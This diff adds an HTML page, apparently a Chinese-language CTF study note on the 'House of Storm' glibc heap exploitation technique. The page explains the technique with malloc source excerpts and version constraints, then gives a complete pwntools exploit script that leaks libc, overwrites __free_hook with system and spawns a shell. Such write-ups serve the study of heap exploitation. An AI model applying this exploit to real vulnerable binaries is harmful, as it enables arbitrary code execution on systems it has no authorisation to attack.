@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title># House of Storm,House of Storm</title>
+    <link rel="stylesheet" href="/assets/css/notes.min.css">
+</head>
+<body>
+    <div class="main-content-wrapper">
+        <main class="content">
+            <h1>House of Storm</h1>
+<h2>1.基本原理</h2>
+<p>unsorted bin attack 能够通过将目标地址链入 unsorted bin 然后取出其中另一个 chunk 从而在目标地址对应的 bk 写入 unsorted_chunks (av) ，然而如果我们想要将链入 unsorted bin 的 fake chunk
+申请出来却通不过检查。这就需要利用 large bin 的特性伪造 fake chunk 的 size 和 fd 字段</p>
+<p>利用条件：</p>
+<ul>
+<li>glibc 版本小于 2.30, 因为 2.30 之后加入了检查</li>
+<li>需要攻击者在 <code>large_bin</code> 和 <code>unsorted_bin</code> 中分别布置一个 chunk 这两个 chunk 需要在归位之后处于同一个 <code>largebin</code> 的 index 中且 <code>unsorted_bin</code> 中的 chunk 要比 <code>large_bin</code> 中的大</li>
+<li>需要 <code>unsorted_bin</code> 中的 <code>bk</code> 指针可控, 要指向可写内存</li>
+<li>需要 <code>large_bin</code> 中的 <code>bk</code> 指针和 <code>bk_nextsize</code> 指针可控</li>
+<li>利用 large bin attack 分别错位写一个 size 和 bk 的地址，size 错位写了 0x56（由于 pie 的原因，chunk 的地址总是为 6 字节，但是头部地址可能是 0x55 或者 0x56，这里需要 0x56 才能成功，因为 malloc 后会进行检测，一半成功的概率，如果 pie 关闭，该方法失效）</li>
+</ul>
+<p>从 unsortedbin 中取出 chunk</p>
+<pre><code class="language-c">bck = victim-&gt;bk;
+...
+/* remove from unsorted list */
+unsorted_chunks (av)-&gt;bk = bck;
+bck-&gt;fd = unsorted_chunks (av);
+</code></pre>
+<p>由于取出的 chunk 大小不在 small bin 范围，所以将放入 large bin</p>
+<pre><code class="language-c">/* place chunk in bin */
+
+if (in_smallbin_range (size))
+{
+  victim_index = smallbin_index (size);
+  bck = bin_at (av, victim_index);
+  fwd = bck-&gt;fd;
+}
+else
+{ ...
+}
+</code></pre>
+<p>large bin 中的 chunk 是按大小降序排列。首先特判大小小于最小的 chunk 的情况。这里通过 bk 访问最小的 chunk ，根据事先的构造，待加入 large bin 的 chunk 大于 large bin 中最小的 chunk ，因此执行的是 else 里的内容</p>
+<pre><code class="language-c">else
+{
+  victim_index = largebin_index (size);
+  bck = bin_at (av, victim_index);
+  fwd = bck-&gt;fd;
+
+  /* maintain large bins in sorted order */
+  // largebin 不为空条件下
+  if (fwd != bck)
+    {
+      /* Or with inuse bit to speed comparisons */
+      size |= PREV_INUSE;
+      /* if smaller than smallest, bypass loop below */
+      assert (chunk_main_arena (bck-&gt;bk));
+      // 如果小于 largebin 中最小 chunk 的情况
+      if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))
+        {
+          fwd = bck;
+          bck = bck-&gt;bk;
+
+          victim-&gt;fd_nextsize = fwd-&gt;fd;
+          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
+          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+        }
+      // 不插在最后的情况
+      else
+        {
+          assert (chunk_main_arena (fwd));
+          // 遍历查找插入位置的前一个 chunk（fwd）
+          while ((unsigned long) size &lt; chunksize_nomask (fwd))
+            {
+              fwd = fwd-&gt;fd_nextsize;
+  			  assert (chunk_main_arena (fwd));
+            }
+		  // 如果与前一个 chunk 大小相等，则正好插在前一个 fwd 的后一个位置
+          if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
+            /* Always insert in the second position.  */
+            fwd = fwd-&gt;fd;
+          // 居中插入的情况
+          else
+            {
+              victim-&gt;fd_nextsize = fwd;
+              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
+              fwd-&gt;bk_nextsize = victim;
+              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+            }
+          bck = fwd-&gt;bk;
+        }
+    }
+  else
+    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;
+}
+
+mark_bin (av, victim_index);
+victim-&gt;bk = bck;
+victim-&gt;fd = fwd;
+fwd-&gt;bk = victim;
+bck-&gt;fd = victim;
+</code></pre>
+<p>这里主要对fakechunk进行了两次写入的操作，一次是<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>,一次是<code>fwd-&gt;bk = victim</code>,分别用于伪造fakechunk的size和bk字段</p>
+<p><img src="/0101/PWN/堆利用/House/assets/6.House_of_Storm/image-20250415160954667.png" alt="image-20250415160954667"></p>
+<p>精心构造成如下写的形式：</p>
+<ul>
+<li>
+<p>在开启pie的情况下，heap的地址首字节为0x55（01010101）或0x56（01010110），最后三位分别代表N、M、P，如果首地址字节为0x55，那么is_mmapped置0，会判断 arena_for_chunk(mem2chunk(victim))。由于 NON_MAIN_ARENA 置位导致计算出的 arena 不是 main_arena(ar_ptr) 因此通不过检查，所以首字节必须是0x56，此时直接mmapped通过检查即可。也就是说在运行时有一半的概率是修改正确的</p>
+<pre><code class="language-c">assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
+      ar_ptr == arena_for_chunk (mem2chunk (victim)));
+
+#define arena_for_chunk(ptr) \
+  (chunk_main_arena (ptr) ? &amp;main_arena : heap_for_ptr (ptr)-&gt;ar_ptr)
+</code></pre>
+</li>
+<li>
+<p>之后我们再遍历unsortedbin将fakechunk申请出来</p>
+</li>
+</ul>
+<p><img src="/0101/PWN/堆利用/House/assets/6.House_of_Storm/image-20250415190516483.png" alt="image-20250415190516483"></p>
+<p>glibc-2.27加入了tcache，那么此时遍历unsortedbin之后会把找到的合适chunk放到tcache中然后继续遍历，因此还会触发报错，所以需要先将tcache填满，最后通过calloc申请触发house of storm</p>
+<p>glibc-2.28会对unsortedbin进行如下检查：</p>
+<pre><code class="language-c">/* remove from unsorted list */
+if (__glibc_unlikely (bck-&gt;fd != victim))
+malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);
+</code></pre>
+<p>glibc-2.30开始对largebin有如下检查：</p>
+<pre><code class="language-c">if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))
+malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);
+</code></pre>
+<p>该方法失效</p>
+<h2>2.利用思路</h2>
+<p>exp：</p>
+<pre><code class="language-python">from pwn import *
+
+elf_path = './pwn'
+libc_path = './libc.so.6'
+elf = ELF(elf_path, checksec=False)
+libc = ELF(libc_path)
+context(arch=elf.arch, os=elf.os, log_level=&quot;debug&quot;)
+# context.terminal = ['tmux','splitw','-h']
+ip = '8.147.135.93'
+port = 37051
+
+local = 1
+if local:
+    p = process([elf_path])
+else:
+    p = remote(ip, port)
+
+# session = ssh(host='node5.buuoj.cn', port=26482, user='CTFMan', password='guest')
+# p = session.process(['./vuln'])
+#-----------------------------------------------------------------------------------------
+it      = lambda                    :p.interactive()
+sd      = lambda data               :p.send((data))
+sa     	= lambda delim,data         :p.sendafter((delim), (data))
+sl      = lambda data               :p.sendline((data))
+sla     = lambda delim,data         :p.sendlineafter((delim), (data))
+r       = lambda numb=4096          :p.recv(numb)
+ru      = lambda delims, drop=False :p.recvuntil(delims, drop)
+rl      = lambda                    :p.recvline()
+l       = lambda str1               :log.success(str1)
+li      = lambda str1,data1         :log.success(str1+' ========&gt; '+hex(data1))
+uu32    = lambda data               :u32(data.ljust(4, b&quot;\x00&quot;))
+uu64    = lambda data               :u64(data.ljust(8, b&quot;\x00&quot;))
+n64     = lambda x                  :(x + 0x10000000000000000) &amp; 0xFFFFFFFFFFFFFFFF
+u32Leakbase = lambda offset         :u32(ru(b&quot;\xf7&quot;)[-4:]) - offset
+u64Leakbase = lambda offset         :u64(ru(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - offset
+#-----------------------------------------------------------------------------------------
+
+def add_chunk(index, size):
+    sla(b&quot;choice:\n&quot;, b&quot;1&quot;)
+    sla(b&quot;index:\n&quot;, str(index).encode())
+    sla(b&quot;size:\n&quot;, str(size).encode())
+
+def delete_chunk(index):
+    sla(b&quot;choice:\n&quot;, b&quot;2&quot;)
+    sla(b&quot;index:\n&quot;, str(index).encode())
+
+def edit_chunk(index, content):
+    sla(b&quot;choice:\n&quot;, b&quot;3&quot;)
+    sla(b&quot;index:\n&quot;, str(index).encode())
+    sla(b&quot;length:\n&quot;, str(len(content)).encode())
+    sa(b&quot;content:\n&quot;, content)
+
+def show_chunk(index):
+    sla(b&quot;choice:\n&quot;, b&quot;4&quot;)
+    sla(b&quot;index:\n&quot;, str(index).encode())
+
+def exit_p():
+    sla(b&quot;choice:\n&quot;, b&quot;5&quot;)
+
+add_chunk(0, 0x418)
+add_chunk(1, 0x18)
+add_chunk(2, 0x428)
+add_chunk(3, 0x18)
+delete_chunk(0)
+show_chunk(0)
+libc.address = u64Leakbase(0x39bb78)
+li(&quot;libc.address&quot;, libc.address)
+
+add_chunk(10, 0x500)
+edit_chunk(0, p64(0)+p64(libc.sym['__free_hook']-8)+p64(0)+p64(libc.sym['__free_hook']-0x10-0x18-5))
+delete_chunk(2)
+edit_chunk(2, p64(0)+p64(libc.sym['__free_hook']-0x10))
+
+add_chunk(4, 0x48)
+edit_chunk(4, p64(libc.sym['system']))
+edit_chunk(1, b&quot;/bin/sh\x00&quot;)
+delete_chunk(1)
+# #
+# gdb.attach(p)
+# pause()
+p.interactive()
+</code></pre>
+
+        </main>
+    </div>
+</body>
+</html>
